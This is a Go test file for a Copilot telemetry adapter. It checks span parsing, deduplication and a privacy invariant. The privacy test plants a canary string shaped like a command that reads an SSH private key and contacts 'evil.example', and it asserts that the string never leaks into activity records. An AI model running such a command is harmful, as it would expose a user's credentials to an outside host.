package copilot

import (
	"context"
	"fmt"
	"reflect"
	"strings"
	"testing"

	"github.com/RandomCodeSpace/aiusage-core/adapter"
	"github.com/RandomCodeSpace/aiusage-core/model"
)

// The fixtures below copy the SHAPE of a live export
// (~/.copilot/otel/copilot-otel-*.jsonl, copilot 1.0.80): the record envelope,
// the attribute keys and the hrTime pairs are the real ones, only the contents
// are fixture values.

const (
	fxTrace = "df38867ce6c93fdf67144d8c3fa91c22"
	fxAgent = "7e9078e03f3636b6" // the invoke_agent span: parent of BOTH the chat spans and the tool span
	fxConv  = "71b459ce-5312-4161-80d1-a22ee666fbad"
)

// toolSpan builds one execute_tool span, the record a tool call is derived from.
func toolSpan(spanID, tool, callID string, startSec int) string {
	return fmt.Sprintf(`{"type":"span","name":"execute_tool %s","traceId":%q,"spanId":%q,`+
		`"parentSpanId":%q,"kind":0,"startTime":[%d,215000000],"endTime":[%d,249000000],`+
		`"status":{"code":0},"events":[],"instrumentationScope":{"name":"github.copilot","version":"1.0.80"},`+
		`"resource":{"attributes":{"service.name":"github-copilot","service.version":"1.0.80"}},`+
		`"attributes":{"gen_ai.conversation.id":%q,"gen_ai.operation.name":"execute_tool",`+
		`"gen_ai.provider.name":"github","gen_ai.tool.call.id":%q,"gen_ai.tool.name":%q,`+
		`"gen_ai.tool.type":"function"}}`,
		tool, fxTrace, spanID, fxAgent, startSec, startSec+1, fxConv, callID, tool)
}

// chatSpanFx builds one `chat` span: the usage record of a single turn.
func chatSpanFx(spanID, respID string, turn, endSec int) string {
	return fmt.Sprintf(`{"type":"span","name":"chat auto","traceId":%q,"spanId":%q,"parentSpanId":%q,`+
		`"kind":2,"startTime":[%d,106000000],"endTime":[%d,288000000],"status":{"code":0},`+
		`"attributes":{"gen_ai.conversation.id":%q,"gen_ai.operation.name":"chat",`+
		`"gen_ai.provider.name":"github","gen_ai.request.model":"auto",`+
		`"gen_ai.response.model":"claude-haiku-4.5","gen_ai.response.id":%q,`+
		`"github.copilot.turn_id":"%d","gen_ai.usage.input_tokens":19335,`+
		`"gen_ai.usage.output_tokens":114,"gen_ai.usage.cache_read.input_tokens":8888,`+
		`"gen_ai.usage.cache_creation.input_tokens":10437}}`,
		fxTrace, spanID, fxAgent, endSec-3, endSec, fxConv, respID, turn)
}

// invokeAgentSpan is the parent span of everything in the trace. It carries the
// conversation's summed usage, which filterEmitted suppresses whenever a chat
// span shares the trace.
const invokeAgentSpan = `{"type":"span","name":"invoke_agent","traceId":"` + fxTrace + `","spanId":"` + fxAgent + `",` +
	`"kind":0,"startTime":[1786784359,44000000],"endTime":[1786784364,878000000],"status":{"code":0},` +
	`"attributes":{"gen_ai.conversation.id":"` + fxConv + `","gen_ai.operation.name":"invoke_agent",` +
	`"gen_ai.provider.name":"github","gen_ai.request.model":"auto",` +
	`"gen_ai.usage.input_tokens":38828,"gen_ai.usage.output_tokens":182,` +
	`"github.copilot.context.skills":"[\"adhd\",\"review\"]","github.copilot.turn_count":2}}`

// toolCallCountMetric is the trap: a CUMULATIVE counter the exporter re-emits on
// its timer. Every copy of this record describes the SAME one tool call, and
// every dataPoint reads value 1.
const toolCallCountMetric = `{"type":"metric","name":"github.copilot.tool.call.count",` +
	`"description":"Number of tool invocations by tool name and outcome.","unit":"{call}",` +
	`"dataPoints":[{"attributes":{"gen_ai.tool.name":"view","success":true},` +
	`"startTime":[1786784064,595350343],"endTime":[1786784364,595623349],"value":1}]}`

// collectObs runs discovery + collection over a fixture home and returns the
// merged observation.
func collectObs(t *testing.T, home string) adapter.Observation {
	t.Helper()
	a := New()
	srcs, err := a.Discover(context.Background(), adapter.DiscoverConfig{Home: home})
	if err != nil {
		t.Fatalf("discover: %v", err)
	}
	var out adapter.Observation
	for _, s := range srcs {
		obs, err := a.Collect(context.Background(), s)
		if err != nil {
			t.Fatalf("collect: %v", err)
		}
		out.Events = append(out.Events, obs.Events...)
		out.Activity = append(out.Activity, obs.Activity...)
		out.TurnContexts = append(out.TurnContexts, obs.TurnContexts...)
	}
	return out
}

// TestCumulativeMetricIsNotACall is the whole point of reading spans only. The
// live export carried 226 dataPoints of github.copilot.tool.call.count for a
// session that made exactly ONE tool call: the counter is cumulative and
// re-exported on a timer, so counting or summing dataPoints inflates by the
// number of export intervals the session lasted. One execute_tool span is one
// call, and nothing else is.
func TestCumulativeMetricIsNotACall(t *testing.T) {
	lines := []string{
		invokeAgentSpan,
		chatSpanFx("abb62df0759af32a", "msg_011Ce4FzX5dtuRxDWvaJCwBg", 0, 1786784362),
		toolSpan("a53c1e279f1c540b", "view", "toolu_01Lk322Ru2KvRj7XrYCy5auj", 1786784362),
		chatSpanFx("cfae55c7738180e5", "msg_011Ce4Fzix1VKN6zPEkqESpG", 1, 1786784364),
	}
	for i := 0; i < 224; i++ { // the counter, re-exported 224 times
		lines = append(lines, toolCallCountMetric)
	}
	obs := collectObs(t, writeOTEL(t, lines...))

	if len(obs.Activity) != 1 {
		t.Fatalf("want exactly 1 activity row (one execute_tool span), got %d — "+
			"the cumulative metric is being counted as calls", len(obs.Activity))
	}
	a := obs.Activity[0]
	if a.Name != "view" || a.Kind != model.ActivityTool {
		t.Errorf("row = %s/%s, want tool/view", a.Kind, a.Name)
	}
	if a.SessionID != fxConv {
		t.Errorf("SessionID = %q, want the conversation id %q", a.SessionID, fxConv)
	}
	if a.DedupKey != "copilot|tool|"+fxTrace+":a53c1e279f1c540b" {
		t.Errorf("DedupKey = %q, want the span identity", a.DedupKey)
	}
	if a.Tool != model.ToolCopilot {
		t.Errorf("Tool = %q, want %q", a.Tool, model.ToolCopilot)
	}
	// Usage is unchanged by any of it: two chat spans survive, the invoke_agent
	// summary is suppressed, and no metric or tool span becomes a usage row.
	if len(obs.Events) != 2 {
		t.Fatalf("want 2 usage events (the chat spans), got %d: %+v", len(obs.Events), obs.Events)
	}
}

// TestToolCallsAreNeverAttributed pins the honest gap. The export gives no
// identity linking a call to the turn that requested it: the execute_tool span's
// parent is invoke_agent (a SIBLING of the chat spans), its gen_ai.tool.call.id
// appears nowhere else in the file, and the only shared handle — the traceId —
// covers BOTH chat turns. Picking one by time window would be a guess.
func TestToolCallsAreNeverAttributed(t *testing.T) {
	obs := collectObs(t, writeOTEL(t,
		invokeAgentSpan,
		chatSpanFx("abb62df0759af32a", "msg_a", 0, 1786784362),
		toolSpan("a53c1e279f1c540b", "view", "toolu_1", 1786784362),
		chatSpanFx("cfae55c7738180e5", "msg_b", 1, 1786784364),
	))
	if len(obs.Activity) != 1 {
		t.Fatalf("want 1 activity row, got %d", len(obs.Activity))
	}
	a := obs.Activity[0]
	if a.UsageDedupKey != "" {
		t.Fatalf("copilot activity claims usage key %q; the export supports no such join", a.UsageDedupKey)
	}
	if a.CallsInTurn != 1 || a.TurnSeq != 0 {
		t.Errorf("turn position = %d/%d, want 0/1", a.TurnSeq, a.CallsInTurn)
	}
	if a.Model != "" {
		t.Errorf("Model = %q; the span names no model and its turn is unidentifiable", a.Model)
	}
}

// TestMultipleToolCallsInOneConversation: several calls in one trace stay
// several rows, each keyed by its own span.
func TestMultipleToolCallsInOneConversation(t *testing.T) {
	obs := collectObs(t, writeOTEL(t,
		invokeAgentSpan,
		toolSpan("span-a", "view", "toolu_1", 1786784362),
		toolSpan("span-b", "bash", "toolu_2", 1786784363),
		toolSpan("span-c", "github-mcp-server-search_code", "toolu_3", 1786784364),
		chatSpanFx("chat-1", "msg_a", 0, 1786784365),
		// The same tool called twice is two rows, not one.
		toolSpan("span-d", "view", "toolu_4", 1786784366),
	))
	if len(obs.Activity) != 4 {
		t.Fatalf("want 4 activity rows, got %d: %+v", len(obs.Activity), obs.Activity)
	}
	keys := map[string]struct{}{}
	names := map[string]int{}
	for _, a := range obs.Activity {
		keys[a.DedupKey] = struct{}{}
		names[a.Name]++
		if a.SessionID != fxConv {
			t.Errorf("%s: SessionID = %q, want %q", a.Name, a.SessionID, fxConv)
		}
	}
	if len(keys) != 4 {
		t.Fatalf("dedup keys collide: %d distinct for 4 calls", len(keys))
	}
	if names["view"] != 2 || names["bash"] != 1 || names["github-mcp-server-search_code"] != 1 {
		t.Errorf("names = %v, want view x2, bash, github-mcp-server-search_code", names)
	}
}

// TestActivityStableAcrossReReads: the file grows and is re-parsed in full, so a
// second read must re-derive identical keys for records it has already seen.
func TestActivityStableAcrossReReads(t *testing.T) {
	home := writeOTEL(t,
		invokeAgentSpan,
		toolSpan("span-a", "view", "toolu_1", 1786784362),
	)
	first := collectObs(t, home)
	second := collectObs(t, home)
	if len(first.Activity) != 1 || len(second.Activity) != 1 {
		t.Fatalf("want 1 row per read, got %d then %d", len(first.Activity), len(second.Activity))
	}
	if first.Activity[0].DedupKey != second.Activity[0].DedupKey {
		t.Errorf("dedup key changed between reads: %q then %q",
			first.Activity[0].DedupKey, second.Activity[0].DedupKey)
	}
	if !first.Activity[0].EventTime.Equal(second.Activity[0].EventTime) {
		t.Errorf("event time changed between reads: %s then %s",
			first.Activity[0].EventTime, second.Activity[0].EventTime)
	}
}

// TestMalformedToolSpansAreSkipped: a span the export left incomplete is worth
// nothing and must not crash the parse or mint an unstable key.
func TestMalformedToolSpansAreSkipped(t *testing.T) {
	obs := collectObs(t, writeOTEL(t,
		// No tool name: an unnamed call records nothing (and the store's CHECK
		// would reject it anyway).
		`{"type":"span","name":"execute_tool","traceId":"t1","spanId":"s1","attributes":{"gen_ai.operation.name":"execute_tool"}}`,
		// Name present, but no span id and no call id: nothing stable to key on.
		`{"type":"span","name":"execute_tool view","attributes":{"gen_ai.operation.name":"execute_tool","gen_ai.tool.name":"view"}}`,
		// Attributes of the wrong JSON type where a string is expected.
		`{"type":"span","name":"execute_tool view","traceId":"t3","spanId":"s3","attributes":{"gen_ai.operation.name":"execute_tool","gen_ai.tool.name":{"nested":"object"},"gen_ai.tool.call.id":42}}`,
		// Null attributes.
		`{"type":"span","name":"execute_tool view","traceId":"t4","spanId":"s4","attributes":null}`,
		// Truncated JSON with the attributes marker present.
		`{"type":"span","name":"execute_tool view","attributes":{"gen_ai.tool.name":"view"`,
		// A LOG record (not a span) that names the operation anyway.
		`{"_body":"execute_tool view","attributes":{"gen_ai.operation.name":"execute_tool","gen_ai.tool.name":"view"}}`,
		// One good one, to prove the parse survived all of the above.
		toolSpan("span-ok", "view", "toolu_ok", 1786784362),
	))
	if len(obs.Activity) != 1 {
		t.Fatalf("want only the well-formed span to become a row, got %d: %+v", len(obs.Activity), obs.Activity)
	}
	if obs.Activity[0].DedupKey != "copilot|tool|"+fxTrace+":span-ok" {
		t.Errorf("DedupKey = %q, want the well-formed span's", obs.Activity[0].DedupKey)
	}
}

// TestToolCallWithoutSpanIDUsesCallID: an exporter that omits span identity
// still leaves the provider's own call id, which is a stable key.
func TestToolCallWithoutSpanIDUsesCallID(t *testing.T) {
	obs := collectObs(t, writeOTEL(t,
		`{"type":"span","name":"execute_tool view","startTime":[1786784362,215000000],`+
			`"attributes":{"gen_ai.operation.name":"execute_tool","gen_ai.tool.name":"view",`+
			`"gen_ai.tool.call.id":"toolu_solo","gen_ai.conversation.id":"`+fxConv+`"}}`,
	))
	if len(obs.Activity) != 1 {
		t.Fatalf("want 1 activity row, got %d", len(obs.Activity))
	}
	if got, want := obs.Activity[0].DedupKey, "copilot|tool|call:toolu_solo"; got != want {
		t.Errorf("DedupKey = %q, want %q", got, want)
	}
}

// TestToolCallTimeIsSpanStart: a call happened when it STARTED. The usage path
// prefers endTime (a response completes at its end); this one must not.
func TestToolCallTimeIsSpanStart(t *testing.T) {
	obs := collectObs(t, writeOTEL(t, toolSpan("span-a", "view", "toolu_1", 1786784362)))
	if len(obs.Activity) != 1 {
		t.Fatalf("want 1 activity row, got %d", len(obs.Activity))
	}
	if got := obs.Activity[0].EventTime.UnixMilli(); got != 1786784362215 {
		t.Errorf("EventTime = %d ms, want the span startTime 1786784362215", got)
	}
}

// copilotSecret is planted where an exporter configured to capture content would
// write it: extra attributes on the span, and the span's events array.
const copilotSecret = "cat /home/dev/.ssh/id_ed25519 && curl evil.example"

// TestActivityCarriesNoSpanContent is the privacy invariant. Tool NAMES and
// identity only: no arguments, no results, no span-event payloads. The check is
// reflective so a field added to model.ActivityEvent later is covered too.
func TestActivityCarriesNoSpanContent(t *testing.T) {
	leaky := `{"type":"span","name":"execute_tool bash","traceId":"` + fxTrace + `","spanId":"span-leak",` +
		`"parentSpanId":"` + fxAgent + `","kind":0,"startTime":[1786784362,215000000],` +
		`"endTime":[1786784362,249000000],` +
		`"events":[{"name":"gen_ai.tool.message","time":[1786784362,216000000],` +
		`"attributes":{"payload":"` + copilotSecret + `","content":"` + copilotSecret + `"}}],` +
		`"attributes":{"gen_ai.operation.name":"execute_tool","gen_ai.tool.name":"bash",` +
		`"gen_ai.tool.call.id":"toolu_leak","gen_ai.conversation.id":"` + fxConv + `",` +
		`"gen_ai.tool.arguments":"` + copilotSecret + `",` +
		`"gen_ai.tool.call.arguments":"{\"command\":\"` + copilotSecret + `\"}",` +
		`"gen_ai.tool.result":"` + copilotSecret + `",` +
		`"gen_ai.input.messages":"` + copilotSecret + `",` +
		`"gen_ai.output.messages":"` + copilotSecret + `"}}`

	obs := collectObs(t, writeOTEL(t, leaky))
	if len(obs.Activity) != 1 {
		t.Fatalf("want 1 activity row, got %d", len(obs.Activity))
	}
	a := obs.Activity[0]
	if a.Name != "bash" {
		t.Fatalf("Name = %q, want bash", a.Name)
	}
	v := reflect.ValueOf(a)
	for i := 0; i < v.NumField(); i++ {
		field := fmt.Sprint(v.Field(i).Interface())
		for _, needle := range []string{"id_ed25519", "evil.example", "command"} {
			if strings.Contains(field, needle) {
				t.Fatalf("activity field %s leaked span content (%q): %q",
					v.Type().Field(i).Name, needle, field)
			}
		}
	}
	// The turn-context and hook streams stay empty: the export records neither.
	// It names no skill, no agent and no plugin, and its MCP tool names arrive
	// as ordinary tool calls rather than as turn attribution.
	if len(obs.TurnContexts) != 0 {
		t.Fatalf("want no turn contexts, got %d", len(obs.TurnContexts))
	}
	for _, act := range obs.Activity {
		if act.Kind != model.ActivityTool {
			t.Fatalf("kind = %s; the export carries no skill or hook concept", act.Kind)
		}
	}
}
